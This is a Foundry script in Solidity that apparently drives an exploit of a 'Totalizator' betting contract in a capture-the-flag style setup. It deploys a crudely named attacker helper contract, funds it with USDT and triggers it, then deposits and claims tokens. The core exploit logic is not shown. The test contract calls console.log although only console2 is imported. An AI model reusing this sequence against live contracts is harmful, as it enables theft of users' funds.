// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../src/Totalizator.sol";

/**
 * Starting distribution
 * totalizator received 10,000,000 TT...
 * RandomHolder1 received 141,421.356237309504879168 Uniswap V2...
 * RandomHolder1 received 19,999,999.999999999999999 Uniswap V2...
 * USDT / WBTC received 20,000,000 USDT...
 * USDT / WBTC received 1,000 WBTC...
 * TT / USDT pair received 20,000,000 USDT...
 * TT / USDT pair received 20,000,000 TT...
 */

contract Step1 is Script {
    function setUp() public {}
    
    function run() public {
        vm.startBroadcast();

        Totalizator totalizator = Totalizator(0x1E12492386AbcB30de16F98456847E6633E156f8);
        ERC20 usdt = ERC20(totalizator.usdt());
        TotalizatorEbalka ebalka = new TotalizatorEbalka(totalizator);

        usdt.transfer(address(ebalka), usdt.balanceOf(msg.sender));
        ebalka.ebatt();

        vm.stopBroadcast();
    }
}

contract Step2 is Script {
    function setUp() public {}
    
    function run() public {
        vm.startBroadcast();

        Totalizator totalizator = Totalizator(0x1E12492386AbcB30de16F98456847E6633E156f8);
        ERC20 tt = ERC20(totalizator.token());

        tt.approve(address(totalizator), tt.balanceOf(address(msg.sender)));
        totalizator.deposit(tt.balanceOf(address(msg.sender)), false);

        vm.stopBroadcast();
    }
}

contract Step3 is Script {
    function setUp() public {}
    
    function run() public {
        vm.startBroadcast();

        Totalizator totalizator = Totalizator(0x1E12492386AbcB30de16F98456847E6633E156f8);
        totalizator.claim();

        vm.stopBroadcast();
    }
}

contract Test is Script {
    function setUp() public {}
    
    function run() public {
        vm.startBroadcast();

        Totalizator totalizator = Totalizator(0x1E12492386AbcB30de16F98456847E6633E156f8);
        console.log(totalizator.price());

        vm.stopBroadcast();
    }
}